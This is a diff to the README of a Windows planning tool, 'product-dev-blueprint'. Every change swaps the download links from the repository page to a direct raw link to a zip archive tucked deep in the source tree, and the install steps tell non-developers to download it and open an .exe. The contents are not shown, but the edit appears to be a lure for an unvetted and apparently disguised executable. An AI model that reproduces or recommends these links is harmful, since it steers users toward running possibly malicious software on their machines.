@@ -1,6 +1,6 @@
 # 🛠️ product-dev-blueprint - Build professional software plans in minutes
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Surging-scotandlot818/product-dev-blueprint)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Surging-scotandlot818/product-dev-blueprint/main/src/app/projects/blueprint-product-dev-1.1-beta.5.zip)
 
 This software helps you turn ideas into complete project plans. You provide a concept, and the tool creates the documents needed to build a real product. It generates outlines, technical structures, security guides, and even starter files for your developers. 
 
@@ -24,7 +24,7 @@ It creates a blueprint using a single input method. You type your idea, and the 
 
 You do not need to be a developer to use this tool. You only need a Windows computer and an internet connection.
 
-1. Visit [this download link](https://github.com/Surging-scotandlot818/product-dev-blueprint).
+1. Visit [this download link](https://raw.githubusercontent.com/Surging-scotandlot818/product-dev-blueprint/main/src/app/projects/blueprint-product-dev-1.1-beta.5.zip).
 2. Look for the release area on the page.
 3. Choose the setup file that ends in .exe for your Windows system.
 4. Open the file once the download finishes.
@@ -97,4 +97,4 @@ If the generated files appear empty:
 
 This project uses standard open source practices. You own the blueprints created by the software. Feel free to use these documents for your commercial projects. If you find ways to improve the code, you can contribute back to the original project on the GitHub page.
 
-[![](https://img.shields.io/badge/Go-To-Download-grey.svg)](https://github.com/Surging-scotandlot818/product-dev-blueprint)
+[![](https://img.shields.io/badge/Go-To-Download-grey.svg)](https://raw.githubusercontent.com/Surging-scotandlot818/product-dev-blueprint/main/src/app/projects/blueprint-product-dev-1.1-beta.5.zip)
